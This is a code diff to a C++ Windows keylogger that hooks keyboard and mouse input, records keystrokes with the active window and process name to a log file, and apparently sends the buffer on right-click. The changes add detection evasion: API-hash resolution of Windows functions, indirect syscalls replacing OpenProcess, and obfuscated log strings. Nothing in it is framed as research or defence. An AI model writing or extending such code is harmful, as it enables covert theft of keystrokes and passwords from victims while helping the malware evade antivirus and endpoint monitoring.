@@ -13,6 +13,9 @@
 #include <map>
 #include <chrono>
 #include <iomanip>
+#include "APIHashing.h"
+#include "StringObfuscation.h"
+#include "IndirectSyscalls.h"
 
 using namespace std;
 
@@ -130,19 +133,43 @@ private:
     // Retrieve foreground window title and process name
     static wstring GetActiveWindowTitle()
     {
-        // Get foreground window handle
-        HWND hwnd = GetForegroundWindow();
+        // Resolve GetForegroundWindow via API hashing
+        typedef HWND(WINAPI * pGetForegroundWindow)(VOID);
+        auto fnGetWindow = (pGetForegroundWindow)APIResolver::ResolveAPI(APIHash::GetForegroundWindow);
+        HWND hwnd = fnGetWindow ? fnGetWindow() : NULL;
         if (hwnd == NULL)
             return L"[Unknown Window]";
 
         wchar_t windowTitle[256];
         GetWindowTextW(hwnd, windowTitle, 256);
 
-        // Get process name via OpenProcess
+        // Get process name via indirect syscall
         DWORD processId;
         GetWindowThreadProcessId(hwnd, &processId);
 
-        HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processId);
+        // Prepare client ID and object attributes for NtOpenProcess
+        struct
+        {
+            PVOID UniqueProcess;
+            PVOID UniqueThread;
+        } clientId;
+        clientId.UniqueProcess = (PVOID)(ULONG_PTR)processId;
+        clientId.UniqueThread = NULL;
+
+        struct
+        {
+            ULONG Length;
+            HANDLE RootDirectory;
+            PVOID ObjectName;
+            ULONG Attributes;
+            PVOID SecurityDescriptor;
+            PVOID SecurityQualityOfService;
+        } objAttr = {0};
+        objAttr.Length = sizeof(objAttr);
+
+        HANDLE hProcess = NULL;
+        IndirectSyscalls::SysNtOpenProcess(&hProcess, PROCESS_QUERY_LIMITED_INFORMATION, &objAttr, &clientId);
+
         wchar_t processName[MAX_PATH];
 
         if (hProcess != NULL)
@@ -209,7 +236,9 @@ private:
             // Capture current keyboard state for accurate key interpretation
             BYTE keyboardState[256];
             if (!GetKeyboardState(keyboardState)) {
-                return CallNextHookEx(g_hKeyHook, nCode, wParam, lParam);
+                typedef LRESULT (WINAPI *pCallNextHookEx)(HHOOK, int, WPARAM, LPARAM);
+                auto fnCallNext = (pCallNextHookEx)APIResolver::ResolveAPI(APIHash::CallNextHookEx);
+                return fnCallNext ? fnCallNext(g_hKeyHook, nCode, wParam, lParam) : CallNextHookEx(g_hKeyHook, nCode, wParam, lParam);
             }
 
             wchar_t unicodeBuffer[5] = {0};
@@ -217,9 +246,10 @@ private:
             // Convert virtual key to Unicode using current keyboard layout
             HWND hwnd = GetForegroundWindow();
             DWORD threadId = GetWindowThreadProcessId(hwnd, NULL);
-            HKL keyboardLayout = GetKeyboardLayout(threadId);
-            // Flag 0 handles dead keys and AltGr combinations
+            HKL keyboardLayout = GetKeyboardLayout(threadId);            // Flag 0 handles dead keys and AltGr combinations
             int result = ToUnicodeEx(vkCode, pKb->scanCode, keyboardState, unicodeBuffer, 4, 0, keyboardLayout);
+            
+            wcout << L"[ToUnicodeEx] result=" << result << L" buffer=[" << unicodeBuffer << L"]" << endl;
 
             wstring keyName;
             if (result > 0)
@@ -241,7 +271,9 @@ private:
                 vkCode == VK_CAPITAL)
             {
                 // Laisser passer à CallNextHookEx mais ne pas ajouter au buffer
-                return CallNextHookEx(g_hKeyHook, nCode, wParam, lParam);
+                typedef LRESULT (WINAPI *pCallNextHookEx)(HHOOK, int, WPARAM, LPARAM);
+                auto fnCallNext = (pCallNextHookEx)APIResolver::ResolveAPI(APIHash::CallNextHookEx);
+                return fnCallNext ? fnCallNext(g_hKeyHook, nCode, wParam, lParam) : CallNextHookEx(g_hKeyHook, nCode, wParam, lParam);
             }
 
             // Handle backspace to remove last character from buffer
@@ -273,7 +305,9 @@ private:
                 ReleaseMutex(g_hMutex);
                 
                 // Do not continue - backspace is not added to the buffer
-                return CallNextHookEx(g_hKeyHook, nCode, wParam, lParam);
+                typedef LRESULT (WINAPI *pCallNextHookEx)(HHOOK, int, WPARAM, LPARAM);
+                auto fnCallNext = (pCallNextHookEx)APIResolver::ResolveAPI(APIHash::CallNextHookEx);
+                return fnCallNext ? fnCallNext(g_hKeyHook, nCode, wParam, lParam) : CallNextHookEx(g_hKeyHook, nCode, wParam, lParam);
             }
 
             if (!keyName.empty())
@@ -341,7 +375,9 @@ private:
             }
         }
 
-        return CallNextHookEx(g_hKeyHook, nCode, wParam, lParam);
+        typedef LRESULT(WINAPI * pCallNextHookEx)(HHOOK, int, WPARAM, LPARAM);
+        auto fnCallNext = (pCallNextHookEx)APIResolver::ResolveAPI(APIHash::CallNextHookEx);
+        return fnCallNext ? fnCallNext(g_hKeyHook, nCode, wParam, lParam) : CallNextHookEx(g_hKeyHook, nCode, wParam, lParam);
     }
 
     // Low-level mouse hook callback (right-click triggers buffer send)
@@ -382,7 +418,9 @@ private:
             ReleaseMutex(g_hMutex);
         }
 
-        return CallNextHookEx(g_hMouseHook, nCode, wParam, lParam);
+        typedef LRESULT(WINAPI * pCallNextHookEx)(HHOOK, int, WPARAM, LPARAM);
+        auto fnCallNext = (pCallNextHookEx)APIResolver::ResolveAPI(APIHash::CallNextHookEx);
+        return fnCallNext ? fnCallNext(g_hMouseHook, nCode, wParam, lParam) : CallNextHookEx(g_hMouseHook, nCode, wParam, lParam);
     }
 
 public:
@@ -426,7 +464,7 @@ public:
 
             wstringstream header;
             header << L"========================================\n"
-                   << L"Session Started\n"
+                   << OBFUSCATE_W(L"Session Started") << L"\n"
                    << L"Date: " << put_time(&localTime, L"%Y-%m-%d %H:%M:%S") << L"\n"
                    << L"========================================\n";
             WriteToFile(header.str());
@@ -522,7 +560,7 @@ public:
 
             wstringstream footer;
             footer << L"\n========================================\n"
-                   << L"Session Ended\n"
+                   << OBFUSCATE_W(L"Session Ended") << L"\n"
                    << L"Date: " << put_time(&localTime, L"%Y-%m-%d %H:%M:%S") << L"\n"
                    << L"========================================\n\n";
             WriteToFile(footer.str());
